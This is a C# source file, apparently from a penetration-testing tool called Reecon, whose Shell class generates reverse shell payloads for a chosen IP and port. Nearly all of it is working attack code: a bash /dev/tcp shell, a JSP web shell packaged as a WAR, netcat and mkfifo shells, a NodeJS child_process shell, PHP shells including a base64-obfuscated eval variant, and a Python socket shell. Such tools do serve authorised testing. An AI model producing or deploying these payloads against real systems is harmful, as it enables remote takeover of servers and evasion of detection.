using System;
using System.Text;

namespace Reecon
{
    class Shell
    {
        public static void GetInfo(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Shell Usage: reecon --shell shellType [IP Port]");
                Console.WriteLine("Types: bash, jsp, nc, nodejs, php, python, war");
                General.GetIP();
                return;
            }
            string shellType = args[1];
            string ip = "10.0.0.1";
            string port = "9001";
            if (args.Length == 2)
            {
                Console.WriteLine("Don't forget to change the IP / Port!");
                General.GetIP();
            }
            if (args.Length == 3)
            {
                ip = args[2];
            }
            if (args.Length == 4)
            {
                ip = args[2];
                port = args[3];
            }
            if (shellType == "bash")
            {
                Console.WriteLine("Bash Shell");
                Console.WriteLine("----------");
                Console.WriteLine(BashShell(ip, port));
            }
            else if (shellType == "jsp")
            {
                Console.WriteLine("JSP Shell");
                Console.WriteLine("---------");
                Console.WriteLine(JSPShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Save as file.jsp");
            }
            else if (shellType == "nc")
            {
                Console.WriteLine("Netcat Shell");
                Console.WriteLine("------------");
                Console.WriteLine(NCShell(ip, port));
            }
            else if (shellType == "nodejs")
            {
                Console.WriteLine("NodeJS Shell");
                Console.WriteLine("------------");
                Console.WriteLine(NodeJSShell(ip, port));
            }
            else if (shellType == "php")
            {
                Console.WriteLine("PHP Shell");
                Console.WriteLine("---------");
                Console.WriteLine(PHPShell(ip, port));
            }
            else if (shellType == "python")
            {
                Console.WriteLine("Python Shell");
                Console.WriteLine("------------");
                Console.WriteLine(PythonShell(ip, port));

            }
            else if (shellType == "sh")
            {
                Console.WriteLine("sh Shell");
                Console.WriteLine("--------");
                Console.WriteLine(SHShell(ip, port));
            }
            else if (shellType == "war")
            {
                Console.WriteLine("WAR Shell");
                Console.WriteLine("---------");
                Console.WriteLine(JSPShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Save as file.jsp");
                Console.WriteLine("--> zip file.war file.jsp");
            }
            else
            {
                Console.WriteLine("Unknown Shell: " + shellType);
            }
        }

        private static string BashShell(string ip, string port)
        {
            // http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
            return "#!/bin/bash" + Environment.NewLine + "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1" + Environment.NewLine + "Note: File header is only required if it's a file and not a command";
        }

        private static string JSPShell(string ip, string port)
        {
            return "<%@page import=\"java.lang.* \"%><%@page import=\"java.util.* \"%><%@page import=\"java.io.* \"%><%@page import=\"java.net.* \"%><% class StreamConnector extends Thread { InputStream is; OutputStream os; StreamConnector( InputStream is, OutputStream os ) { this.is = is; this.os = os; } public void run() { BufferedReader in = null; BufferedWriter out = null; try { in = new BufferedReader( new InputStreamReader( this.is ) ); out = new BufferedWriter( new OutputStreamWriter( this.os ) ); char buffer[] = new char[8192]; int length; while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) { out.write( buffer, 0, length ); out.flush(); } } catch( Exception e ){} try { if( in != null ) in.close(); if( out != null ) out.close(); } catch( Exception e ){} } } try {" + Environment.NewLine
                    + "Socket socket = new Socket(\"" + ip + "\", " + port + ");" + Environment.NewLine
                    + "Process process = Runtime.getRuntime().exec(\"/bin/bash\");" + Environment.NewLine
                    + "(new StreamConnector(process.getInputStream(), socket.getOutputStream())).start(); (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();} catch(Exception e ) {} %>";
        }

        private static string NCShell(string ip, string port)
        {
            string shellOne = $"nc {ip} {port} -e /bin/sh";
            string shellTwo = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
            return shellOne + Environment.NewLine + shellTwo;
        }

        private static string NodeJSShell(string ip, string port)
        {
            Console.WriteLine("Test: (function(){return \"Reelix\"})()");
            return $"require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f', ()=>{{}})";
        }

        private static string PHPShell(string ip, string port)
        {
            string plainShell = $"exec(\"/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'\");";
            string b64Shell = System.Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell));
            string evalShell = "eval(base64_decode('" + b64Shell + "'));";
            return "Regular: <?php " + plainShell + " ?>" + Environment.NewLine
                + "Safer: <?php " + evalShell + " ?>" + Environment.NewLine
                + "No Upload: php -r \"" + evalShell + "\"";
        }

        private static string PythonShell(string ip, string port)
        {
            return $"import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('{ip}', {port})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(['/bin/bash', '-i']);";
        }

        private static string SHShell(string ip, string port)
        {
            return $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
        }
    }
}
